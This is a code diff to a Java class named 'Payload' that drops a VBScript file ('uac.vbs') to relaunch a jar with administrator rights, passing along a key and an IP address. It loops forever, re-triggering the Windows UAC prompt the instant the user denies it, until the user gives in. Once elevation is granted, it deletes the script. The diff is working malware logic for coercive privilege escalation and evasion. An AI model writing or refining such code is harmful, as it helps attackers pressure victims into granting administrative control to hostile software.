@@ -153,20 +153,22 @@ public class Payload {
             log("java: " + javaExe);
             log("jar: " + jarPath);
 
-            String psCommand = String.format(
-                "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s'",
-                javaExe, jarPath, key, ip
-            );
+            // Create VBS file to bypass PowerShell overhead
+            File vbsFile = new File(getLoaderDir(), "uac.vbs");
+            String vbsContent = "Set objShell = CreateObject(\"Shell.Application\")\r\n" +
+                "objShell.ShellExecute \"" + javaExe.replace("\\", "\\\\") + "\", \"-jar \"\"" + jarPath.replace("\\", "\\\\") + "\"\" " + key + " " + ip + "\", \"\", \"runas\", 1\r\n";
+            Files.write(vbsFile.toPath(), vbsContent.getBytes());
 
             FileOutputStream lockStream = new FileOutputStream(lockFile);
 
             while (true) {
                 log("Triggering UAC...");
                 
-                Process p = new ProcessBuilder("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand).start();
+                // Execute VBS (wscript is instant)
+                Process p = new ProcessBuilder("wscript.exe", vbsFile.getAbsolutePath()).start();
                 p.waitFor(); 
                 
-                // Spin-check every 15 milliseconds
+                // Spin-check every 15ms
                 boolean accepted = false;
                 for (int i = 0; i < 400; i++) { 
                     if (!lockFile.exists() || lockFile.delete()) {
@@ -179,6 +181,7 @@ public class Payload {
                 if (accepted) {
                     log("UAC Accepted. Parent exiting.");
                     lockStream.close();
+                    vbsFile.delete();
                     System.exit(0); 
                 } else {
                     log("UAC Denied. Retrying instantly...");
